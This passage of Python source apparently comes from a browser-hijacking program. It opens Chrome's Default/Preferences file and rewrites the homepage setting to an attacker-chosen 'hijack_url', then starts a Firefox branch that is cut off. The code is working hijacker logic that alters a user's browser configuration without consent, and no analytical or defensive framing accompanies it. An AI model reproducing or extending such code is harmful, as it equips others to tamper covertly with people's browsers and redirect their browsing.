            with open(chrome_path + "/Default/Preferences", "r+") as f:
                content = f.read()
                f.seek(0)
                f.write(content.replace('"homepage":', f'"homepage": "{hijack_url}",'))
                f.truncate()
        elif "firefox" in browser.name:
